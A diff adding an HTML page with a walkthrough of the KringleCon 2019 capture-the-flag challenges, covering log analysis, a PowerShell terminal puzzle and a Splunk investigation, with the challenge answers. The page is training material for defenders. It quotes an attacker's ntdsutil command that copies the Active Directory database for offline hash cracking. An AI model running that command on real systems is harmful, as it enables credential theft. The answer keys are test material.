+  <a href="#hint-from-wunorse-openslae" title="Hint from Wunorse Openslae" class="md-nav__link">
+    Hint from Wunorse Openslae
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus" title="Talk to Krampus" class="md-nav__link">
+    Talk to Krampus
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#block-naughty-hosts" title="Block naughty hosts" class="md-nav__link">
+    Block naughty hosts
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visit-the-bell-tower" title="Visit the Bell Tower" class="md-nav__link">
+    Visit the Bell Tower
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>Game Walkthru</h1>
+                
+                <h2 id="objective-0-talk-to-santa-in-the-quad">Objective 0 - Talk to Santa in the Quad</h2>
+<p><em>Enter the campus quad and talk to Santa.</em></p>
+<div class="admonition quote">
+<p><img align="left" src="img/santa_umbrella.png">
+This is a little embarrassing, but I need your help.
+Our KringleCon turtle dove mascots are missing!
+They probably just wandered off.
+Can you please help find them?</p>
+<p>To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.
+Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap!
+We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons.
+After you find the Turtle Doves and complete objectives 2-5, please come back and let me know.</p>
+<p>Not sure where to start? Try hopping around campus and talking to some elves.
+If you help my elves with some quicker problems, they'll probably remember clues for the objectives.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Santa is holding an umbrella.  Who does he think he is?  <strong>Mary Poppins??</strong></p>
+</div>
+<h2 id="objective-1-find-the-turtle-doves">Objective 1 - Find the turtle doves</h2>
+<p><em>Find the missing turtle doves.</em></p>
+<p>Bounce around and explore the Elf U campus.  You'll find Michael and Jane (the turtle doves) by the fireplace hearth in the Student Union.  Click on them.  They say "Hoot hoot?".  This completes the objective.  You earn an achievement and another part of the narrative is added to your badge.</p>
+<p><center><img alt="" src="img/turtledoves.png" /></center></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Jane and Michael Banks are the children in <em>Mary Poppins</em>.</p>
+</div>
+<h2 id="objective-2-unredact-threatening-document">Objective 2 - Unredact Threatening Document</h2>
+<p><em>Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.
+(Difficulty 1 of 5)</em></p>
+<p>Find the threatening document in the corner of the quad between Hermey Hall and the Student Union.  Click on the document to download a copy to your computer, and open it with a PDF reader.</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>If you are concerned about opening a strange PDF file on your computer, kudos to you!<br />
+You can alternatively use pdf2txt, a program available in most Linux distributions that can extract text from a PDF file.</p>
+</div>
+<p>The interesting bits of this document are redacted, however the original text is simply obscured behind red shaded rectangles.  To read all of the text, press Ctrl+A to select all text and Ctrl+C to copy it to your clipboard.  Now open a text editor and press Ctrl+V to paste and read the plain text.</p>
+<blockquote>
+<p>Date: February 28, 2019</p>
+<p>To the Administration, Faculty, and Staff of Elf University<br />
+17 Christmas Tree Lane<br />
+North Pole</p>
+<p>From: A Concerned and Aggrieved Character</p>
+<p>Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR
+ELSE!</p>
+<p>Attention All Elf University Personnel,</p>
+<p>It remains a constant source of frustration that Elf University and the entire operation at the
+North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE
+you to consider lending your considerable resources and expertise in providing merriment,
+cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical
+characters.</p>
+<p>For centuries, we have expressed our frustration at your lack of willingness to spread your
+cheer beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
+holidays and mythical characters that need your direct support year-round.</p>
+<p>If you do not accede to our demands, we will be forced to take matters into our own hands.
+We do not make this threat lightly. You have less than six months to act demonstrably.</p>
+<p>Sincerely,</p>
+<p>--A Concerned and Aggrieved Character</p>
+</blockquote>
+<p><strong>Answer: DEMAND</strong></p>
+<h2 id="objective-3-windows-log-analysis-evaluate-attack-outcome">Objective 3 - Windows Log Analysis: Evaluate Attack Outcome</h2>
+<p><em>We're seeing attacks against the Elf U domain! Using the <a href="https://downloads.elfu.org/Security.evtx.zip">event log data</a>, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. (Difficulty 1 of 5)</em></p>
+<p>Earlier, Bushy Evergreen hinted about a tool called DeepBlueCLI.  Learn more about it in <a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html">a presentation by its author Eric Conrad</a>, then download it from https://github.com/sans-blue-team/DeepBlueCLI, and also download the security event log file linked in the objective.  Unpack these files on your local disk.  </p>
+<p>Start Powershell, change directory to where you unpacked your files, and run <code>.\DeepBlue.ps1 -file Security.evtx | Out-GridView</code></p>
+<p>This produces a GUI grid view of the output from DeepBlueCLI.  At the top, notice that the tool has discovered a password spray attack.</p>
+<p><img alt="deepbluecli screenshot" src="img/eventlog-pwspray.png" /></p>
+<p>Scroll down and observe that each of the target accounts received 77 bad password attempts except for supatree.  Assuming that the attacker also tried 77 passwords again the supatree account, then one of the attempts must have been successful.</p>
+<p><img alt="deepbluecli screenshot" src="img/eventlog-supatree-attempts.png" /></p>
+<p><strong>Answer: supatree</strong></p>
+<h2 id="objective-4-windows-log-analysis-determine-attacker-technique">Objective 4 - Windows Log Analysis: Determine Attacker Technique</h2>
+<p><em>Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary. (Difficulty 2 of 5)</em></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The music in Hermey Hall also has a <em>Mary Poppins</em> themed intro, this time from the song Chim-Chim-Cheree, which goes:  </p>
+<p><center>"When the's 'ardly no day<br />
+Nor 'ardly no night<br />
+There's things 'alf in shadow<br />
+And 'alf way in light<br />
+On the roof tops of London<br />
+Cool, what a sight."</center></p>
+</div>
+<h3 id="talk-to-sugarplum-mary">Talk to Sugarplum Mary</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf9.png">Oh me oh my - I need some help!</p>
+<p>I need to review some files in my Linux terminal, but I can't get a file listing.</p>
+<p>I know the command is ls, but it's really acting up.</p>
+<p>Do you think you could help me out? As you work on this, think about these questions:</p>
+<p>&nbsp;&nbsp;&nbsp;1. Do the words in green have special significance?</p>
+<p>&nbsp;&nbsp;&nbsp;2. How can I find a file with a specific name?</p>
+<p>&nbsp;&nbsp;&nbsp;3. What happens if there are multiple executables with the same name in my $PATH?</p>
+</div>
+<h3 id="terminal-linux-path">Terminal: Linux Path</h3>
+<p><img alt="" src="img/terminal-path.png" /></p>
+<p>When you attempt to get a file listing using the <code>ls</code> command, only a message <code>This isn't the ls you're looking for</code> is returned.  Using the hints, run <code>which ls</code> to find the full path of the executable that is being run.  It's unusual for ls to be found in /usr/local/bin/ls.  </p>
+<p>Run <code>find / -name ls -print 2&gt;/dev/null</code> (or <code>locate -b '\ls'</code>) and notice that <code>/bin/ls</code> also exists.  Most likely, the path environment variable has /usr/local/bin listed before /bin.  When you call an executable without its full path, the operating system will check each of the directories listed in the path until it finds one, first match wins.  Confirm that by running <code>echo $PATH</code>.</p>
+<p>To switch this around, run <code>export PATH=/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin</code>.  Now when you execute <code>ls</code>, it will use the one in /bin.</p>
+<p>To summarize:</p>
+<div class="codehilite"><pre><span></span>elf@a51e82c1af55:~$ which ls
+/usr/local/bin/ls
+
+elf@a51e82c1af55:~$ find / -name ls -print 2&gt;/dev/null
+/usr/local/bin/ls
+/bin/ls
+
+elf@a51e82c1af55:~$ export PATH=/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin
+elf@a51e82c1af55:~$ ls
+&#39; &#39;   rejected-elfu-logos.txt
+Loading, please wait......
+
+You did it! Congratulations!
+</pre></div>
+
+
+<h3 id="hint-from-sugarplum-mary">Hint from Sugarplum Mary</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf9.png">Oh there they are! Now I can delete them. Thanks!</p>
+<p>Have you tried the Sysmon and EQL challenge?</p>
+<p>If you aren't familiar with Sysmon, Carlos Perez has some great info about it.</p>
+<p>Haven't heard of the Event Query Language?</p>
+<p>Check out some of Ross Wolf's work on EQL or that blog post by Josh Wright in your badge.</p>
+</div>
+<h3 id="analyze-logs-with-eql">Analyze logs with EQL</h3>
+<p>Download the json log file and install the python eql module.</p>
+<p>The challenge states that password hashes were obtained using the lsass.exe process, and you need to figure out which tool was used.</p>
+<p>First run a query to find out what processes were spawned by lsass.exe.  Pipe the output of eql through jq, to make the output easier to read.</p>
+<div class="codehilite"><pre><span></span>$ eql query -f sysmon-data.json &quot;process where parent_process_name = &#39;lsass.exe&#39;&quot; | jq
+{
+  &quot;command_line&quot;: &quot;C:\\Windows\\system32\\cmd.exe&quot;,
+  &quot;event_type&quot;: &quot;process&quot;,
+  &quot;logon_id&quot;: 999,
+  &quot;parent_process_name&quot;: &quot;lsass.exe&quot;,
+  &quot;parent_process_path&quot;: &quot;C:\\Windows\\System32\\lsass.exe&quot;,
+  &quot;pid&quot;: 3440,
+  &quot;ppid&quot;: 632,
+  &quot;process_name&quot;: &quot;cmd.exe&quot;,
+  &quot;process_path&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+  &quot;subtype&quot;: &quot;create&quot;,
+  &quot;timestamp&quot;: 132186398356220000,
+  &quot;unique_pid&quot;: &quot;{7431d376-dedb-5dd3-0000-001027be4f00}&quot;,
+  &quot;unique_ppid&quot;: &quot;{7431d376-cd7f-5dd3-0000-001013920000}&quot;,
+  &quot;user&quot;: &quot;NT AUTHORITY\\SYSTEM&quot;,
+  &quot;user_domain&quot;: &quot;NT AUTHORITY&quot;,
+  &quot;user_name&quot;: &quot;SYSTEM&quot;
+}
+</pre></div>
+
+
+<p>From this output, notice that lsass.exe was used to launch a command line (cmd.exe), and its process ID is 3440.  Using that information, query for processes that were started in that command line, which would have a parent process ID of 3440.</p>
+<div class="codehilite"><pre><span></span>$ eql query -f sysmon-data.json &quot;process where ppid = 3440&quot; | jq
+{
+  &quot;command_line&quot;: &quot;ntdsutil.exe  \&quot;ac i ntds\&quot; ifm \&quot;create full c:\\hive\&quot; q q&quot;,
+  &quot;event_type&quot;: &quot;process&quot;,
+  &quot;logon_id&quot;: 999,
+  &quot;parent_process_name&quot;: &quot;cmd.exe&quot;,
+  &quot;parent_process_path&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+  &quot;pid&quot;: 3556,
+  &quot;ppid&quot;: 3440,
+  &quot;process_name&quot;: &quot;ntdsutil.exe&quot;,
+  &quot;process_path&quot;: &quot;C:\\Windows\\System32\\ntdsutil.exe&quot;,
+  &quot;subtype&quot;: &quot;create&quot;,
+  &quot;timestamp&quot;: 132186398470300000,
+  &quot;unique_pid&quot;: &quot;{7431d376-dee7-5dd3-0000-0010f0c44f00}&quot;,
+  &quot;unique_ppid&quot;: &quot;{7431d376-dedb-5dd3-0000-001027be4f00}&quot;,
+  &quot;user&quot;: &quot;NT AUTHORITY\\SYSTEM&quot;,
+  &quot;user_domain&quot;: &quot;NT AUTHORITY&quot;,
+  &quot;user_name&quot;: &quot;SYSTEM&quot;
+}
+</pre></div>
+
+
+<p>The attacker used the command <code>ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q</code>, which Windows administrators can use to create a backup of the Active Directory database.  Since the backup files contain all of the user password hashes, this can also be used by attackers for offline password cracking.</p>
+<p><strong>Answer: ntdsutil</strong></p>
+<h2 id="objective-5-network-log-analysis-determine-compromised-system">Objective 5 - Network Log Analysis: Determine Compromised System</h2>
+<p><em>The attacks don't stop! Can you help identify the IP address of the malware-infected system using <a href="https://downloads.elfu.org/elfu-zeeklogs.zip">these Zeek logs</a>? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry. (Difficulty 2 of 3)</em></p>
+<h3 id="talk-to-sparkle-redberry">Talk to Sparkle Redberry</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf3.png">I'm Sparkle Redberry and Imma chargin' my laser!</p>
+<p>Problem is: the settings are off.</p>
+<p>Do you know any PowerShell?</p>
+<p>It'd be GREAT if you could hop in and recalibrate this thing.</p>
+<p>It spreads holiday cheer across the Earth ...</p>
+<p>... when it's working!</p>
+</div>
+<h3 id="terminal-xmas-cheer-laser">Terminal: Xmas Cheer Laser</h3>
+<p><img alt="Xmas Cheer Laser" src="img/terminal-laser.png" /></p>
+<p>Follow the hint listed in the welcome message on the terminal, and look at the contents of /home/callingcard.txt.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-content /home/callingcard.txt
+What&#39;s become of your dear laser?
+Fa la la la la, la la la la
+Seems you can&#39;t now seem to raise her!
+Fa la la la la, la la la la
+Could commands hold riddles in hist&#39;ry?
+Fa la la la la, la la la la
+Nay! You&#39;ll ever suffer myst&#39;ry!
+Fa la la la la, la la la la
+</pre></div>
+
+
+<p>This suggests that you should look at the command history next, which shows recent commands were recently run.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-history
+
+  Id CommandLine
+  -- -----------
+   1 Get-Help -Name Get-Process 
+   2 Get-Help -Name Get-* 
+   3 Set-ExecutionPolicy Unrestricted 
+   4 Get-Service | ConvertTo-HTML -Property Name, Status &gt; C:\services.htm 
+   5 Get-Service | Export-CSV c:\service.csv 
+   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
+   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
+   8 Get-EventLog -Log &quot;Application&quot; 
+   9 I have many name=value variables that I share to applications system wide. At a co…
+  10 get-content /home/callingcard.txt
+</pre></div>
+
+
+<p>Line 7 suggests that the angle value could be 65.5.  </p>
+<p>Line 9 appears like another clue, but it's truncated.  Get the full value of that CommandLine.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; $(get-history)[8] | select CommandLine | fl
+
+CommandLine : I have many name=value variables that I share to applications system 
+              wide. At a command I will reveal my secrets once you Get my Child Items.
+</pre></div>
+
+
+<p>List out the environment variables, where many name=value variables are often found.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-childitem env:\ 
+
+Name                           Value
+----                           -----
+_                              /bin/su
+DOTNET_SYSTEM_GLOBALIZATION_I… false
+HOME                           /home/elf
+HOSTNAME                       118dde22a0ca
+LANG                           en_US.UTF-8
+LC_ALL                         en_US.UTF-8
+LOGNAME                        elf
+MAIL                           /var/mail/elf
+PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/b…
+PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mo…
+PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/sha…
+PWD                            /home/elf
+RESOURCE_ID                    19f83ef6-3d53-4fc3-8e99-2385558bc877
+riddle                         Squeezed and compressed I am hidden away. Expand me from…
+SHELL                          /home/elf/elf
+SHLVL                          1
+TERM                           xterm
+USER                           elf
+USERDOMAIN                     laserterminal
+userdomain                     laserterminal
+username                       elf
+USERNAME                       elf
+
+PS /home/elf&gt; get-childitem env:\riddle | fl
+
+Name  : riddle
+Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will 
+        show you the way. Recurse through all /etc and Sort on my LastWriteTime to 
+        reveal im the newest of all.
+</pre></div>
+
+
+<p>Find the file that is hidden somewhere in the /etc directory.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-childitem /etc -file -recurse -ErrorAction SilentlyContinue `
+  | sort -Descending LastWriteTime | select fullname, length -First 5
+
+FullName          Length
+--------          ------
+/etc/apt/archive 5662902
+/etc/hostname         13
+/etc/resolv.conf     113
+/etc/hosts           175
+/etc/mtab             12
+</pre></div>
+
+
+<p>Extract the archive and examine its contents.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; Expand-Archive -path /etc/apt/archive -DestinationPath /home/elf
+PS /home/elf&gt; dir
+
+    Directory: /home/elf
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---          12/13/19  5:15 PM                depths
+d-----          12/18/19  8:39 PM                refraction
+--r---          12/13/19  4:29 PM           2029 motd
+
+PS /home/elf&gt; dir refraction
+
+
+    Directory: /home/elf/refraction
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+------           11/7/19 11:57 AM            134 riddle
+------           11/5/19  2:26 PM        5724384 runme.elf
+
+PS /home/elf/refraction&gt; gc ./riddle
+Very shallow am I in the depths of your elf home. You can find my entity by using my 
+md5 identity:
+
+25520151A320B5B0D21561F92C8F6224
+</pre></div>
+
+
+<p>Change the mode on the runme.elf and execute it to get the refraction value.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf/refraction&gt; chmod 755 ./runme.elf
+PS /home/elf/refraction&gt; ./runme.elf
+refraction?val=1.867
+</pre></div>
+
+
+<p>That provides the refraction value.  Refraction: 1.867
+Now search for the file with the given hash value.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-childitem /home/elf -file -recurse -ErrorAction SilentlyContinue `
+  | select DirectoryName,Name,@{N=&#39;FileHash&#39;;E={(Get-FileHash -Algo MD5 $_).Hash}} `
+  | select-string &quot;25520151A320B5B0D21561F92C8F6224&quot;
+
+@{DirectoryName=/home/elf/depths/produce; Name=thhy5hll.txt; 
+FileHash=25520151A320B5B0D21561F92C8F6224}
+</pre></div>
+
+
+<p>This file provides the value for temperature and another hint.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; gc /home/elf/depths/produce/thhy5hll.txt      
+temperature?val=-33.5
+
+I am one of many thousand similar txt&#39;s contained within the deepest of /home/elf/depths. 
+Finding me will give you the most strength but doing so will require Piping all the FullName&#39;s 
+to Sort Length.
+</pre></div>
+
+
+<p>That provides the value for temperature.  Temperature: -33.5
+Now find the biggest file.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; get-childitem /etc -file -recurse -ErrorAction SilentlyContinue `
+  | sort -Descending length | select fullname, length -First 5                  
+
+FullName                                               Length
+--------                                               ------
+/etc/systemd/system/timers.target.wants/EventLog.xml 10006962
+/etc/apt/archive                                      5662902
+/etc/ssl/certs/ca-certificates.crt                     207436
+/etc/mime.types                                         24301
+/etc/services                                           19183
+</pre></div>
+
+
+<p>Earlier the answer was in the form of a command line.  Check to see if there are any command line's logged in this file.</p>
+<div class="codehilite"><pre><span></span>PS /home/elf&gt; gc /etc/systemd/system/timers.target.wants/EventLog.xml `
+  | Select-String &quot;CommandLine&quot;
+
+      &lt;S N=&quot;Message&quot;&gt;Process Create:_x000D__x000A_RuleName: _x000D__x000A_UtcTime: 
+2019-11-07 17:59:56.525_x000D__x000A_ProcessGuid: 
+{BA5C6BBB-5B9C-5DC4-0000-00107660A900}_x000D__x000A_ProcessId: 3664_x000D__x000A_Image: 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_x000D__x000A_FileVersion: 
+10.0.14393.206 (rs1_release.160915-0644)_x000D__x000A_Description: Windows 
+PowerShell_x000D__x000A_Product: Microsoft® Windows® Operating 
+System_x000D__x000A_Company: Microsoft Corporation_x000D__x000A_OriginalFileName: 
+PowerShell.EXE_x000D__x000A_CommandLine: 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;`$correct_gases_postbody 
+= @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n  
+  Kr=8`n    Rn=9`n}`n&quot;_x000D__x000A_CurrentDirectory: C:\_x000D__x000A_User: 
+ELFURESEARCH\allservices_x000D__x000A_LogonGuid: 
+{BA5C6BBB-5B9C-5DC4-0000-0020F55CA900}_x000D__x000A_LogonId: 
+0xA95CF5_x000D__x000A_TerminalSessionId: 0_x000D__x000A_IntegrityLevel: 
+High_x000D__x000A_Hashes: 
+MD5=097CE5761C89434367598B34FE32893B_x000D__x000A_ParentProcessGuid: 
+{BA5C6BBB-4C79-5DC4-0000-001029350100}_x000D__x000A_ParentProcessId: 
+1008_x000D__x000A_ParentImage: 
+C:\Windows\System32\svchost.exe_x000D__x000A_ParentCommandLine: 
+C:\Windows\system32\svchost.exe -k netsvcs&lt;/S&gt;
+</pre></div>
+
+
+<p>That provides the values for the gas mixture.
+Gas mixture: O='6';H='7';He='3';N='4';Ne='22';Ar='11';Xe='10';F='20';Kr='8';Rn='9'</p>
+<p>Run the following commands to restore the laser.</p>
+<div class="codehilite"><pre><span></span>(Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
+(Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent
+(Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent
+$postParams = @{O=&#39;6&#39;;H=&#39;7&#39;;He=&#39;3&#39;;N=&#39;4&#39;;Ne=&#39;22&#39;;Ar=&#39;11&#39;;Xe=&#39;10&#39;;F=&#39;20&#39;;Kr=&#39;8&#39;;Rn=&#39;9&#39;}
+(Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $postParams)
+(Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent
+(Invoke-WebRequest -Uri http://localhost:1225/api/output).RawContent
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span>Success! - 5.57 Mega-Jollies of Laser Output Reached!
+</pre></div>
+
+
+<h3 id="hint-from-sparkle-redberry">Hint from Sparkle Redberry</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf3.png">You got it - three cheers for cheer!</p>
+<p>For objective 5, have you taken a look at our Zeek logs?</p>
+<p>Something's gone wrong. But I hear someone named Rita can help us.</p>
+<p>Can you and she figure out what happened?</p>
+</div>
+<h3 id="identify-the-malware-infected-system-using-rita">Identify the malware-infected system using RITA</h3>
+<p>Download the Zeek logs from the link in the objective.  Ordinarily, you would need to install RITA from https://www.activecountermeasures.com/free-tools/rita/ to process the Zeek logs.  The files that RITA would generate based on all of the Zeek logs are already provided in the zip file under the ELFU directory.</p>
+<ol>
+<li>Use your web browser to open the index.html</li>
+<li>Select the ELFU database from the list</li>
+<li>Choose Beacons from the menu.</li>
+</ol>
+<p>This table analyzes the connections observed by Zeek between each host IP address pair.  It considers how many connections there were, how much time there was between each connection, and how many bytes of data were sent in each connection.  Hosts that have a higher number of connections, on an even interval, and exchange the same amount of data every time, get a higher score and rise to the top of this list.</p>
+<p><img alt="RITA screenshot" src="img/rita-screenshot.png" /></p>
+<p>RITA gave a near-perfect score of 0.998 to the 7660 connections from 192.168.134.130 to 144.202.46.214.  If you examine the Zeek logs, you'll notice that each one of these connections was an http request for /504vsa/server/vssvc.php.  From this, you can tell the connections are generated by vsagent, a tool developed by Black Hills Information Security to demonstrate how C2C traffic can evade detection by hiding inside of an http <em>VIEWSTATE</em> parameter.</p>
+<p><code>elfu-zeeklogs/http.log-00001_20190823120021.log:1566561621.254485       CWQIp4380SUAVFfJod      192.168.134.130 2152    144.202.46.214  80      1       POST    144.202.46.214  /504vsa/server/vssvc.php        -       Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) 95      237     200     OK      -       -       -       (empty) -       -       -       FHKfVa3aiBpsdJ2WIi      text/plain      FSmWGu4oA9VSTQYNyf      text/html</code></p>
+<p><strong>Answer: 144.202.46.214</strong></p>
+<h3 id="revisit-santa">Revisit Santa</h3>
+<p>Santa instructed you to come back and see him when you were done with objectives 2-5, so do that next.</p>
+<div class="admonition quote">
+<p><img align="left" src="img/santa_umbrella.png">Thank you for finding Jane and Michael, our two turtle doves!
+I’ve got an uneasy feeling about how they disappeared.
+Turtle doves wouldn’t wander off like that.</p>
+<p>Someone must have stolen them! Please help us find the thief!
+It’s a moral imperative!
+I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!</p>
+<p>Gosh, I can’t help but think:<br />
+Winds in the East, snow coming in…<br />
+Like something is brewing and about to begin!<br />
+Can’t put my finger on what lies in store,<br />
+But I fear what’s to happen all happened before!</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Although Mary Poppins says that <em>mist</em> is blowing in, the last 4 lines from Santa are another quote from the movie.</p>
+</div>
+<h2 id="objective-6-splunk">Objective 6 - Splunk</h2>
+<p><em>Access <a href="https://splunk.elfu.org/">https://splunk.elfu.org/</a> as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.  (Difficulty 3 of 5)</em></p>
+<h3 id="talk-to-prof-banas">Talk to Prof Banas</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf7.png">Hi, I'm Dr. Banas, professor of Cheerology at Elf University.</p>
+<p>This term, I'm teaching "HOL 404: The Search for Holiday Cheer in Popular Culture," and I've had quite a shock!</p>
+<p>I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.</p>
+<p>Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP!</p>
+<p>If I don't, he will have to report the incident to the boss of the SOC.</p>
+<p>Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks.  I don't know anything about computer security. Can you please help me?</p>
+</div>
+<h3 id="investigate-an-incident-using-splunk">Investigate an incident using Splunk</h3>
+<p>Log into the Splunk server according to Dr. Banas instructions.  Some guidelines are provided when you first log in.  Follow the prompts in the SOC chat windows.  As you answer questions, further explanation is provided about how the searches were constructed.  If you get stuck, enter an answer from the table below and read the SOC analyst's comments to understand where you went wrong.</p>
+<p><strong>Answers to the training questions</strong></p>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>What is the short host name of Professor Banas' computer?</td>
+<td>sweetums</td>
+</tr>
+<tr>
+<td>What is the name of the sensitive file that was likely accessed and copied by the attacker?</td>
+<td>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</td>
+</tr>
+<tr>
+<td>What is the fully-qualified domain name(FQDN) of the command and control(C2) server?</td>
+<td>144.202.46.214.vultr.com</td>
+</tr>
+<tr>
+<td>What document is involved with launching the malicious PowerShell code?</td>
+<td>19th Century Holiday Cheer Assignment.docm</td>
+</tr>
+<tr>
+<td>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?</td>
+<td>21</td>
+</tr>
+<tr>
+<td>What was the password for the zip archive that contained the suspicious file?</td>
+<td>123456789</td>
+</tr>
+<tr>
+<td>What email address did the suspicious file come from?</td>
+<td>bradly.buttercups@eifu.org</td>
+</tr>
+</tbody>
+</table>
+<p>Once you find answers to all of the questions, you can fetch the document from the archive.  Run a query to determine the file path to the malcious file.</p>
+<div class="codehilite"><pre><span></span>index=main sourcetype=stoq  &quot;results{}.workers.smtp.from&quot;=&quot;bradly buttercups &lt;bradly.buttercups@eifu.org&gt;&quot; | eval results = spath(_raw, &quot;results{}&quot;) 
+| mvexpand results
+| eval path=spath(results, &quot;archivers.filedir.path&quot;), filename=spath(results, &quot;payload_meta.extra_data.filename&quot;), fullpath=path.&quot;/&quot;.filename 
+| search fullpath!=&quot;&quot; 
+| table filename,fullpath
+</pre></div>
+
+
+<p>This reveals a listing of files, including 19th Century Holiday Cheer Assignment.docm.  When you download this file, you'll find that it's been sanitized and replaced with a pointer to the answer.</p>
+<div class="codehilite"><pre><span></span>$ unzip c6e175f5b8048c771b3a3fac5f3295d2032524af
+$ strings c6e175f5b8048c771b3a3fac5f3295d2032524af
+Cleaned for your safety. Happy Holidays!
+In the real world, This would have been a wonderful artifact for you to investigate, but it had malware in it of course so it&#39;s not posted here. Fear not! The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-) 
+</pre></div>
+
+
+<p>Request the core.xml file and read it to get the answer.</p>
+<p><img alt="" src="img/splunk-corexml.png" /></p>
+<p><strong>Answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</strong></p>
+<h3 id="talk-to-prof-banas-again">Talk to Prof Banas again</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf7.png">Oh, thanks so much for your help! Sorry I was freaking out.</p>
+<p>I've got to talk to Kent about using my email again...</p>
+<p>...and picking up my dry cleaning.</p>
+</div>
+<h2 id="objective-7-get-access-to-steam-tunnels">Objective 7 - Get access to steam tunnels</h2>
+<p><em>Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.
+(Difficulty 3 out of 5)</em></p>
+<h3 id="talk-to-tangle-coalbox">Talk to Tangle Coalbox</h3>
+<p>In order to get into the Dormitory, where Minty Candycane is, you'll have to unlock a door that is protected by an electronic keypad lock.  Tangle provides a hint to help guess the code.</p>
+<div class="admonition quote">
+<p><img align="left" src="img/elf12.png">
+Hey kid, it's me, Tangle Coalbox.</p>
+<p>I'm sleuthing again, and I could use your help.</p>
+<p>Ya see, this here number lock's been popped by someone.</p>
+<p>I think I know who, but it'd sure be great if you could open this up for me.</p>
+<p>I've got a few clues for you.</p>
+<ol>
+<li>One digit is repeated once.</li>
+<li>The code is a prime number.</li>
+<li>You can probably tell by looking at the keypad which buttons are used.</li>
+</ol>
+</div>
+<h3 id="break-the-frosty-doorcode">Break the Frosty Doorcode</h3>
